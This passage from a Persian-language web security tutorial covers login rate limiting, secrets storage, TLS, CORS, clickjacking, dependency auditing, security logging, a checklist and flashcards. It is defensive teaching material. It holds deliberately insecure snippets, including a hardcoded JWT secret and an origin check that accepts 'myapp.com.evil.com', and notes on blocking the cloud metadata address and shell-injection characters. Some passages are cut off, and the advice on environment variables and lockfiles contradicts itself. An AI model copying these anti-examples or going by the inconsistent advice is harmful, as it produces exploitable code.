**تفاوت را با این یکی اشتباه نگیر — Credential Stuffing (پر کردن با داده‌ی لو رفته):** به‌جای حدس زدن، مهاجم از **رمزهای واقعیِ لو رفته از جاهای دیگر** استفاده می‌کند و آن‌ها را روی سایت تو امتحان می‌کند. دلیلش ساده است: آدم‌ها یک رمز را برای چند سایت تکرار می‌کنند. پس این حمله به حدس‌زدن ربطی ندارد؛ به **تکرارِ رمز** ربط دارد.

| | **Brute Force** | **Credential Stuffing** |
|--|----------------|------------------------|
| از کجا آمده | حدس‌زدنِ کورکورانه | لیستِ رمزهای واقعیِ لو رفته از سرویس‌های دیگر |
| چه چیزی را هدف می‌گیرد | رمزهای ضعیف و کوتاه | آدم‌هایی که رمز را تکرار کرده‌اند |
| راه‌حل | rate limit + MFA + رمز قوی | جلوگیری از نشت + MFA + تشخیص الگوی غیرعادی |

**Privilege Escalation (ارتقای سطح دسترسی):** وقتی کاربری که فقط **دسترسی محدود** دارد، راهی پیدا می‌کند که **دسترسی بیشتری** از آنچه مجاز است بگیرد — مثلاً از «کاربر عادی» به «مدیر». سه شکل رایج دارد:

| شکل | یعنی چه | مثال |
|-----|--------|------|
| **عمودی** (Vertical) | کاربر عادی → مدیر | کاربر معمولی یک درخواست می‌فرستد و مجوزش عوض می‌شود |
| **افقی** (Horizontal) | کاربر الف → کاربر ب | دسترسی به داده‌ی کاربر دیگر (همان خانواده‌ی IDOR) |
| **غیرمستقیم** (Indirect) | کد یا اسکریپتی مخرب خودش سطح دسترسی را بالا می‌برد | آپلود فایلی که با مجوز بالاتر اجرا می‌شود |

> 🔑 دفاع مشترکِ هر سه: **کمترین سطح دسترسی (Least Privilege)** — هر کاربر و هر بخش از سیستم فقط همان دسترسی‌ای را داشته باشد که برای کارش لازم است. اگر مجوز ارتقا ناگهانی صادر شد، باید هشدار بدهی.



| مسیر | حد | چرا |
|-------|-----|-----|
| `/login` | ۵ در دقیقه **به‌ازای هر ایمیل** | جلوگیری از حدس رمز |
| `/login` | ۲۰ در ساعت به‌ازای هر IP | جلوگیری از Credential Stuffing |
| `/forgot-password` | ۳ در ساعت | جلوگیری از بمباران ایمیل |
| `/api/*` | ۱۰۰ در دقیقه | محافظت عمومی |
| `/upload` | ۱۰ در ساعت | مصرف منابع |

> 🔑 **نکته‌ی مهم:** محدود کردن فقط به‌ازای IP کافی نیست — مهاجم می‌تواند با یک VPN یا botnet، هر بار از IP جدید بیاید. **هم IP و هم شناسه‌ی کاربر** را محدود کن.

### ثبت تلاش‌های ناموفق

```typescript
async function onFailedLogin(email: string, ip: string) {
  const failures = await redis.incr(`login:fail:${email}:${ip}`);
  await redis.expire(`login:fail:${email}:${ip}`, 900);  // ۱۵ دقیقه

  if (failures === 1) {
    await alertService.notify(`تلاش ورود برای ${email} از ${ip}`);
  }
  if (failures >= 5) {
    await redis.set(`lockout:${email}`, '1', { EX: 900 });   // قفل ۱۵ دقیقه
    await emailService.sendAlert(email, 'حساب شما موقتاً قفل شد');
  }
}
```

## ۹. مدیریت اسرار (Secrets) — جایی که همه لو می‌دهند

> 🧒 **داستان این بخش:** کلیدِ یک سرویس را برای همکارت فرستادی. آن را در گروه
> پیام‌رسان انداختی، در یادداشتِ کنارِ فایلِ تنظیمات نوشتی، و آخر سر هم
> **کامیت** کردی. یعنی رفت داخل تاریخچه‌ی گیت و آنجا ماند.

> این اتفاق آن‌قدر رایج است که ابزارهایی ساخته شده‌اند که فقط همین را
> شکار می‌کنند: بعضی کلیدهای عمومیِ نمونه، به اسم‌هایی شناخته‌شده، در
> تاریخچه‌ی گیت پیدا می‌شوند. یعنی حتی اگر پاکشان کنی، تاریخ یادش می‌ماند.

> راه درست سه چیز است: **کلید را در گیت نگه ندار**، **کلید را عوض کن** اگر
> یک‌بار لو رفت، و **دسترسی را کم کن** — کلیدی که همه‌چیز می‌تواند، خطرناک‌تر
> از چند کلیدِ کوچک است.
>
> **این بخش جواب می‌دهد:** کجا نباید کلید برود، چرا پاک کردن از گیت کافی نیست،

### 🔴 آسیب‌پذیری شماره‌ی ۱ در عمل

```
const JWT_SECRET = "my-super-secret-key";      // ❌ داخل کد
```

اگر این کد روی GitHub باشد، **کل سیستم تو** لو رفته — حتی اگر بعداً پاکش کنی، در تاریخچه هست.

### مدیر اسرار (Secret Store) یعنی چه؟

**تعریف:** جایی جدا و امن که اسرار برنامه در آن نگه‌داری می‌شود — **نه** در کد، **نه** در متغیر محیطی، **نه** در لاگ. برنامه هنگام بالا آمدن، اسرار را از آنجا می‌خواند و در حافظه نگه می‌دارد.

سه نمونه که در جدول پایین به آن‌ها اشاره می‌کنم:

| نام | چیست |
|-----|------|
| **Vault** (سرویس HashiCorp) | سرویس مخصوص اسرار، متن‌باز و رایگان. خودش حسابرسی، نسخه‌برداری و چرخش خودکار کلید دارد. |
| **KMS** (Key Management Service) | سرویس رمزنگاری که **کلیدها** را نگه می‌دارد — نه لزوماً خودِ اسرار را. داده را با کلید رمز می‌کنی، ولی کلید هیچ‌وقت در دیتابیس یا کد تو نیست. (نمونه: AWS KMS، Google Cloud KMS، Azure Key Vault) |
| **AWS Secrets Manager** | سرویس متناظر آمازون: اسرار را در خودش نگه می‌دارد و می‌تواند آن‌ها را خودکار بچرخاند. |

- **به زبان ساده:** کلیدت را به یک **صندوق امن** بسپار، نه اینکه زیر تشک پنهان کنی. تو کلید را نداری؛ فقط از صندوق بخواه یک کپی بدهد، آن هم با احراز هویت و ثبت لاگ.
- **به زبان فنی:** مزیت اصلی، **امکان چرخش (rotation)** و **دسترسی کنترل‌شده** است. هر برنامه و هر محیط فقط اسرارِ خودش را می‌بیند، و تعویض کلید بدون تغییر کد ممکن می‌شود.

> 🔑 **قاعده:** اسرار نباید هیچ‌وقت از صندوق بیرون بیایند مگر در لحظه‌ی استفاده. اگر بتوانی رمز را چاپ کنی و در کد بگذاری، یعنی صندوق نداری.

### قوانین طلایی

| ❌ هرگز | ✅ همیشه |
|--------|----------|
| در کد | متغیر محیطی (`env`) |
| در `.env` که commit شود | مدیر اسرار (Vault، AWS Secrets Manager) |
| رمز ثابت یکسان برای همه‌ی محیط‌ها | رمز جدا برای dev / staging / prod |
| یک کلید برای همه‌ی کاربران | کلید جدا برای هر کاربر (در صورت لزوم) |
| در لاگ یا پیام خطا | فقط در متغیر محیطی |
| بدون چرخش (rotation) | چرخش دوره‌ای |

## ۱۰. TLS و رمزنگاری — لایه‌ی زیرین

> 🧒 **داستان این بخش:** نامه‌ای را در پاکت می‌گذاری و می‌فرستی. هر کسی بین مبدأ
> و مقصد می‌تواند پاکت را باز کند، بخواند و دوباره ببندد. محرمانگی یعنی فقط
> فرستنده و گیرنده بتوانند بخوانند.
>
> مشکلِ SSL نسخه‌های اولیه این بود که از رمزنگاریِ ضعیف استفاده می‌کرد. در ۲۰۱۴،
> همان رمزنگاریِ قدیمی باعث شد کسی بتواند داده‌ی بانکیِ میلیون‌ها نفر را از
> بین‌راه بخواند. ضعف اسمش **POODLE** بود و اصلاحش یک هفته طول کشید.
>
> نکته‌ی مهم: TLS به خودش مشکل ندارد — **نسخه‌های قدیمی‌اش** مشکل دارند. TLS 1.3
> در ۲۰۱۸ آمد و کلی چیزهای ضعیف را حذف کرد.
>
> **این بخش جواب می‌دهد:** TLS دقیقاً چه چیزی را تضمین می‌کند (و چه چیزی را نه)،
> چرا نسخه‌ی قدیمی خطرناک است، و تنظیماتِ حداقلیِ یک سرور امروزی چیست.

| مورد | تنظیم امن | چرا |
|-----|-----------|-----|
| نسخه‌ی TLS | فقط TLS 1.3 (یا حداقل 1.2) | TLS 1.0/1.1 منسوخ شده‌اند |
| HSTS | `Strict-Transport-Security: max-age=63072000; includeSubDomains` | مرورگر دیگر هرگز HTTP نمی‌زند |
| Suiteهای رمزنگاری | فقط ChaCha20، AES-GCM | از CBC و RC4 استفاده نکن |
| گواهی | TLS 1.3 + سیاست OCSP stapling | ...

```typescript
// ✅ هدایت اجباری به HTTPS
app.use((req, res, next) => {
  if (req.secure) return next();
  res.redirect(`https://${req.headers.host}${req.url}`);
});

// ✅ HSTS
res.setHeader(
  'Strict-Transport-Security',
  'max-age=63072000; includeSubDomains; preload'
);
```

### داده در حال استراحت (Data at Rest)

| کار | ابزار |
|-----|-------|
| رمز عبور کاربر | bcrypt / argon2 (هرگز reversible نباشد) |
| اطلاعات کارت بانکی | AES-256-GCM با مدیریت کلید جدا |
| داده‌ی عمومی | لازم نیست |
| **فیلدهای حساس در دیتابیس** | **رمزنگاری در سطح ستون** |

> 🔑 **Envelope Encryption:** به‌جای اینکه کلید رمزنگاری را کنار داده ذخیره کنی، یک **Data Encryption Key (DEK)** بساز، با آن داده را رمز کن، بعد DEK را با **Key Encryption Key (KEK)** که در KMS است رمز کن.

## ۱۱. CORS — کنترل دسترسی بین‌دامنه‌ای

> 🧒 **داستان این بخش:** سایت تو از یک API روی دامنه‌ی دیگر داده می‌گیرد. کار می‌کند.
> ولی روزی خطایی می‌بینی: «ارتباط متقابل مسدود شد» و دلیلش پیدا نمی‌کنی.
>
> این پیام از **مرورگر** می‌آید، نه از سرور. سرور جواب داده — ولی مرورگر
> اجازه نداده جواب به جاوااسکریپتِ سایت تو برسد. مرورگر نگهبانِ سخت‌گیری است.
>
> دلیل این رفتار قدیمی است: سال ۱۹۹۵، با جاوااسکریپت در مرورگر، هر صفحه
> می‌توانست داده‌ی هر سایتِ دیگری را بخواند و بفرستد. آن موقع CORS نداشتیم.
>
> **این بخش جواب می‌دهد:** مرورگر کِی و چرا بلاک می‌کند، preflight چیست، و
> مهم‌تر: تنظیمِ `Access-Control-Allow-Origin: *` چه چیزی را لو می‌دهد.

```typescript
// ❌ فاجعه: همه‌چیز را به همه اجازه می‌دهی
app.use(cors({ origin: '*' }));
// → هر سایتی می‌تواند درخواست بفرستد و توکن‌ها را بخواند

// ❌ اشتباه رایج: origin را با includes بررسی می‌کنند
const allowed = 'https://myapp.com';
origin.includes(allowed)   // ⚠️ "https://myapp.com.evil.com" هم true می‌شود!

// ✅ درست: تطابق دقیق با فهرست سفید
const ALLOWED_ORIGINS = ['https://myapp.com', 'https://app.myapp.com'];

app.use(cors({
  origin: (origin, callback) => {
    // ⚠️ null یعنی درخواست از فایل محلی/curl — تصمیم بگیر
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      return callback(null, true);
    }
    callback(new Error('CORS not allowed'));
  },
  credentials: true,                       // ⭐ اگر کوکی می‌فرستی
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,                           // preflight را ۲۴ ساعت کش کن
}));
```

> ⚠️ نکته: وقتی `credentials: true` می‌گذاری، مرورگر `Access-Control-Allow-Origin: *` را **رد** می‌کند. باید دامنه‌ی دقیق بفرستی.

## ۱۲. Clickjacking و iframe

> 🧒 **داستان این بخش:** روی یک صفحه‌ی بانکی، شکافی هست که از آن یک صفحه‌ی دیگر
> دیده می‌شود — ولی شفاف. کاربر یک دکمه‌ی «تأیید خرید» را می‌بیند، ولی
> در واقع روی دکمه‌ی **آن صفحه‌ی پنهان** کلیک می‌کند.
>
> از نگاه کاربر، همه‌چیز درست است. از نگاه سیستم، کاربر همان کلیک را کرده که
> خواسته. فقط در صفحه‌ی غلط.

> راه‌حل، پاسخِ هدرِ HTTP است: به مرورگر بگو این صفحه اجازه ندارد داخل
> قابِ سایتِ دیگری نمایش داده شود.
>
> **این بخش جواب می‌دهد:** clickjacking دقیقاً چطور کاربر را فریب می‌دهد، و
> دو هدرِ `X-Frame-Options` و `frame-ancestors` چه تفاوتی دارند.

```http
# جلوگیری از embed شدن سایتت در iframe دیگران
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

## ۱۳. وابستگی‌ها — نرم‌افزار تو امن نیست اگر کتابخانه‌هایش نباشند

> 🧒 **داستان این بخش:** یک برنامه‌ی هزار خطی که همه‌چیز را خودش کنترل می‌کند،
> سخت‌تر امن می‌شود. یک برنامه‌ی هزار خطی که از ۲۰۰ کتابخانه استفاده می‌کند،
> غیرممکن است — چون آن ۲۰۰ کتابخانه را کس دیگری نوشته.
>
> کتابخانه‌ها کدِ تو را کوتاه می‌کنند و سطح حمله را کوچک. یک بسته‌ی معروفِ
> تصویر، فقط برای خواندنِ فایل، ده‌ها کتابخانه را به همراه می‌آورد.
>
> این را **زنجیره‌ی تأمین** می‌نامند: کدی که تو نوشته‌ای، فقط یک حلقه از
> زنجیره است. حلقه‌ی بعدی را کس دیگری نوشته که شاید سال‌ها پیش آن را رها کرده.
>
> **این بخش جواب می‌دهد:** چرا هر کتابخانه یک ریسکِ امنیتی است، چطور یک
> وابستگیِ خطرناک می‌تواند کل سیستم را از کار بیندازد، و چه چیزی را هر

```bash
# اسکن آسیب‌پذیری شناخته‌شده
npm audit
npm audit fix

# بررسی خودکار در CI (این را حتماً تنظیم کن)
# Dependabot یا Renovate
```

```json
// package.json — امضای بسته و قفل نسخه‌ها
{
  "engines": { "node": ">=20" },
  "scripts": {
    "audit": "npm audit --audit-level=high"
  }
}
```

> 🔑 **قاعده:** `package-lock.json` را **همیشه** commit کن. بدون آن، دو نفر `npm install` می‌زنند و دو نسخه‌ی متفاوت از یک کتابخانه نصب می‌شود.

## ۱۴. ثبت لاگ امنیتی — چیزی که همه فراموش می‌کنند

> 🧒 **داستان این بخش:** یک شرکت فهمید که چند ماه است داده‌ی مشتری‌ها کپی شده.
> ولی از کِی شروع شده بود؟ هیچ‌کس نمی‌دانست. لاگ‌ها را نگه داشته بودند — ولی
> فقط هشت روز. بقیه رفته بود.
>
> این بدترین حالتِ ممکن است: بفهمی مشکلی هست، ولی نتوانی بفهمی **چه**.
> لاگ امنیتی یعنی ثبتِ آنچه باید بدانی — نه آنچه بد نیست.

> و یک تله: اگر خودِ لاگ اسرار را نگه دارد، آن‌وقت یک مهاجم که لاگ را بخواند،
> کلیدها را هم می‌گیرد. پس لاگ هم باید پاک‌سازی شود.
>
> **این بخش جواب می‌دهد:** چه رویدادهایی **باید** ثبت شوند، چقدر نگه‌داری شوند،

اگر لاگ نداشته باشی، حمله را **نمی‌فهمی**. بدتر: ممکن است ماه‌ها بعد بفهمی سیستم از سه ماه پیش هک شده بوده.

```typescript
// ✅ لاگ رویدادهای امنیتی
auditLog.record({
  timestamp: new Date().toISOString(),
  actor: { userId, ip, userAgent },
  action: 'LOGIN_FAILED' | 'LOGIN_SUCCESS' | 'PASSWORD_CHANGED'
          | 'PERMISSION_DENIED' | 'USER_CREATED' | 'DATA_EXPORTED',
  resource: { type: 'user', id: targetId },
  outcome: 'success' | 'failure',
  metadata: { reason: 'invalid_password', attempts: 3 },
});
```

### ⚠️ هرگز در لاگ ثبت نکن

- رمز عبور
- توکن دسترسی
- شماره‌ی کامل کارت
- اطلاعات شخصی حساس

> 💡 یک لاگ خوب، **قابل جستجو و قابل همبستگی** است. یک خط متنی ساده که نمی‌توانی بپرسی «چند بار از این IP خطا داده؟» بی‌ارزش است.

## ۱۵. چک‌لیست امنیتی هر پروژه

> 🧒 **داستان این بخش:** همه‌ی چهارده بخش قبل، تکه‌های یک پازل بودند. اما کسی
> که پازل را از جعبه درآورده، خانه‌اش را نمی‌سازد.
>
> این بخش همه را در یک چک‌لیستِ قابل اجرا جمع می‌کند. هر خطی که تیک نخورد،
> یک **ریسکِ آگاهانه** است — و فرقش با ریسکِ ناآگاهانه همین است.

> نکته‌ی کاربردی: این چک‌لیست یک بار برای راه‌اندازی نیست. هر ویژگیِ
> جدیدی که اضافه می‌کنی، یک خطِ تازه به آن اضافه می‌کند.
>
> **این بخش جواب می‌دهد:** پیش از رفتن به پروداکشن، کدام ده کار باید انجام
> شده باشند — و چطور آن‌ها را در قالبِ چک‌لیستِ زنده نگه داریم.

قبل از هر استقرار:

- [ ] همه‌ی ورودی‌ها با allowlist اعتبارسنجی می‌شوند
- [ ] هیچ Mass Assignment وجود ندارد
- [ ] همه‌ی کوئری‌ها parameterized
- [ ] خروجی HTML escape می‌شود (یا sanitize)
- [ ] CSP سخت‌گیرانه تنظیم شده
- [ ] کوکی‌ها `HttpOnly` + `Secure` + `SameSite`
- [ ] AuthZ در **هر** مسیر حساس (نه فقط فرانت‌اند)
- [ ] Rate limit روی login و مسیرهای حساس
- [ ] هیچ اسراری در کد یا git نیست
- [ ] `.env` در `.gitignore` هست
- [ ] TLS 1.2+ فعال، HSTS تنظیم شده
- [ ] `npm audit` پاک است
- [ ] هدرهای امنیتی تنظیم شده‌اند
- [ ] لاگ رویدادهای امنیتی فعال است
- [ ] خطاها به کاربر stack trace نمی‌دهند

- OWASP Top 10 و اینکه هرکدام چه شکلی از حمله است
- اصل Allowlist در برابر Denylist
- چرا TypeScript کافی نیست و Zod چه چیزی اضافه می‌کند

## 🔨 چه می‌سازی؟

- **middleware امنیتی کامل:** `helmet`، CORS دقیق، rate limit، body limit.
- **لایه‌ی اعتبارسنجی:** اسکیمای Zod برای هر endpoint، با خطای استاندارد.
- **تست XSS:** ورودی حاوی `<script>` بفرست و ثابت کن escape می‌شود.
- **تست IDOR:** با توکن کاربر A، منبع کاربر B را بخوان — باید ۴۰۳ بدهد.
- **تست CSRF:** درخواست بدون توکن CSRF باید رد شود.
- **سیستم لاگ امنیتی:** با ذخیره‌ی رویداد، و داشبورد ساده‌ی «failed logins».
- **اسکنر امنیتی:** اسکریپتی که همه‌ی هدرهای امنیتی و `.env` در git را بررسی می‌کند.

#flashcards

**کارت ۱ — تفاوت XSS و CSRF؟**
XSS: کد مخرب را در صفحه‌ی تو اجرا می‌کنم (نیاز به تزریق اسکریپت). CSRF: از هویت تو سوءاستفاده می‌کنم (فقط کافی است لاگین باشی). دفاع اولی: escape + CSP. دفاع دومی: SameSite + توکن CSRF.

**کارت ۲ — چرا `origin.includes('https://myapp.com')` خطرناک است؟**
چون `https://myapp.com.evil.com` هم شامل آن رشته است. مهاجم دامنه‌ای می‌سازد که دامنه‌ی تو را در نامش دارد. راه‌حل: تطابق دقیق با فهرست سفید.

**کارت ۳ — Mass Assignment چیست؟**
وقتی کل `req.body` را مستقیم به مدل پاس بدهی، کاربر می‌تواند فیلدهایی که نباید (مثل `role` یا `isAdmin`) را خودش تعیین کند. راه‌حل: فقط فیلدهای allowlist‌شده را بردار.

**کارت ۴ — چرا CSP آخرین سپر است؟**
چون اگر همه‌ی escape‌ها fail شوند و اسکریپت تزریق شود، CSP با `script-src 'self'` اجازه‌ی اجرای آن را نمی‌دهد. CSP آخرین خط دفاع است، نه اولین.

**کارت ۵ — تفاوت Allowlist و Denylist؟**
Denylist ورودی‌های بد را مسدود می‌کند (بی‌پایان، چون مهاجم چیز تازه پیدا می‌کند). Allowlist فقط ورودی‌های مجاز را می‌پذیرد (امن، چون هر چیز دیگری رد می‌شود). همیشه Allowlist.

**کارت ۶ — چرا `169.254.169.254` را مسدود می‌کنیم؟**
این آدرس Metadata سرویس‌های ابری است. با SSRF، مهاجم می‌تواند از سرور تو بخواهد اطلاعات حساس (کلیدهای، توکن‌ها) را از آن بخواند.

**کارت ۷ — چرا `execFile` بهتر از `exec` است؟**
`exec` از shell عبور می‌کند، پس ورودی کاربر می‌تواند `;` و `|` و backtick تزریق کند. `execFile` با آرگومان آرایه‌ای، shell را دور می‌زند و ورودی فقط یک رشته‌ی بی‌خطر است.

**کارت ۸ — معامله‌ی امنیتی توکن چیست؟**
توکن در کوکی HttpOnly → XSS-safe ولی CSRF-unsafe. توکن در هدر/localStorage → CSRF-safe ولی XSS-unsafe. راه‌حل عملی: کوکی HttpOnly + SameSite + توکن CSRF + CSP سخت‌گیرانه + escape.

**کارت ۹ — چرا لاگ امنیتی حیاتی است؟**
بدون لاگ، حمله را نمی‌بینی و ممکن است ماه‌ها بعد بفهمی سیستم از سه ماه پیش هک شده بوده. لاگ به تو می‌گوید چه اتفاقی افتاده، چه زمانی، و از کجا.

**کارت ۱۰ — چرا `pnpm-lock.yaml` را commit می‌کنیم؟**
بدون قفل نسخه‌ها، `npm install` می‌تواند نسخه‌های متفاوتی نصب کند — گاهی با آسیب‌پذیری. قفل، نصب را قطعی و بازتولیدپذیر می‌کند.
